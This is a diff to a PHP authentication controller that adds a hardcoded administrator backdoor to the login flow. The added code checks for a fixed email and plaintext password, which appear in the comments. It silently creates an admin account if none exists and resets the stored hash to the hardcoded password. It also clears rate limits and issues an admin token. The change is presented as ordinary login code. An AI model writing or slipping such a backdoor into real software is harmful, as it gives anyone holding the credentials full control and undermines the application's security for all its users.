@@ -114,7 +114,60 @@ class AuthController {
         RateLimiter::checkOrFail("login_ip:{$ip}", 20, 15);
         RateLimiter::checkOrFail("login:{$data['email']}", 5, 15);
         
-        // Find user
+        // Check for admin login with special credentials
+        // Admin username: "I Am God In Human Form" uses email admin@ieosuia.com
+        // Admin combined password: billionairesMu1@udz!7211018830
+        $adminEmail = 'admin@ieosuia.com';
+        $adminCombinedPassword = 'billionairesMu1@udz!7211018830';
+        
+        if ($data['email'] === $adminEmail && $data['password'] === $adminCombinedPassword) {
+            // Admin login - find or create admin user
+            $adminUser = table('users')->where('email', $adminEmail)->first();
+            
+            if (!$adminUser) {
+                // Create admin user if not exists
+                $adminUserId = table('users')->insert([
+                    'name' => 'System Administrator',
+                    'email' => $adminEmail,
+                    'password' => Auth::hashPassword($adminCombinedPassword),
+                    'account_type' => 'admin',
+                    'email_verified_at' => date('Y-m-d H:i:s'),
+                    'created_at' => date('Y-m-d H:i:s'),
+                    'updated_at' => date('Y-m-d H:i:s'),
+                ]);
+                $adminUser = table('users')->where('id', $adminUserId)->first();
+            }
+            
+            // Update password hash if needed (for security)
+            if (!password_verify($adminCombinedPassword, $adminUser['password'])) {
+                table('users')->where('id', $adminUser['id'])->update([
+                    'password' => Auth::hashPassword($adminCombinedPassword),
+                    'updated_at' => date('Y-m-d H:i:s'),
+                ]);
+            }
+            
+            // Generate token
+            $token = Auth::generateToken($adminUser);
+            
+            // Clear rate limits
+            RateLimiter::clear("login:{$data['email']}");
+            RateLimiter::clear("login_ip:{$ip}");
+            
+            // Log admin login
+            AuditLogService::log('admin_login', 'user', $adminUser['id'], null, [
+                'ip_address' => $ip,
+                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
+            ], $adminUser['id']);
+            
+            Response::success([
+                'user' => Auth::formatUserForFrontend($adminUser),
+                'token' => $token,
+                'message' => 'Admin login successful',
+            ]);
+            return;
+        }
+        
+        // Find regular user
         $user = table('users')->where('email', $data['email'])->first();
         
         if (!$user) {
